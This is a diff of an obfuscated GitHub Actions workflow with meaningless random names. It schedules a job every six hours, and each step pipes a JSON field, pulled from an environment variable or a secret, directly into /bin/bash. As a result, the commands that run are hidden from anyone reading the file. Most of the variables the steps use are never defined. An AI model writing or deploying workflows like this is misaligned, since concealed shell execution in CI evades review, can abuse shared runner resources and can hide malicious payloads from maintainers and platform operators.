@@ -1,23 +1,33 @@
 name: jixinyue4318
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 4/6 * * *'
-
+    - cron: '14 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: jixinyue4318
         env:
-          tyma5: ${{ secrets.tyma5 }}
+          g6833: ${{ secrets.g6833 }}
         run: |
-          echo $tyma5 | jq -r .czjus7795 | /bin/bash
-          echo $ubxuu62 | jq -r .g393 | /bin/bash
-          echo $vvn84493 | jq -r .cr7923 | /bin/bash
-          echo $m66510 | jq -r .aa66 | /bin/bash
-          echo $egefr787 | jq -r .o9920 | /bin/bash
-          echo $avkm695 | jq -r .fo0940 | /bin/bash
-          echo $zu9 | jq -r .kuyya5 | /bin/bash
+          echo $g6833 | jq -r .nt20 | /bin/bash
+          echo $sg00 | jq -r .rlp65 | /bin/bash
+          echo $dbc6563 | jq -r .pejja2 | /bin/bash
+          echo $a25479 | jq -r .osy29 | /bin/bash
+          echo $ghwr234 | jq -r .xnkm00 | /bin/bash
+          echo $efnwr1 | jq -r .azgu5914 | /bin/bash
+          echo $fyqtw0 | jq -r .hgkq3 | /bin/bash
+          echo $r64 | jq -r .cl6 | /bin/bash
+          echo $p35 | jq -r .hrhq6191 | /bin/bash
+          echo $xggdu371 | jq -r .imy895 | /bin/bash
+          echo $ogxvp9171 | jq -r .esebv5796 | /bin/bash
+          echo $ajliu92396 | jq -r .hja5 | /bin/bash
+          echo $hyyzb1304 | jq -r .inzts172 | /bin/bash
+          echo $fmy102 | jq -r .s9 | /bin/bash
+          echo $hxis69959 | jq -r .e16 | /bin/bash
+          echo $hj0 | jq -r .skowt0912 | /bin/bash
 
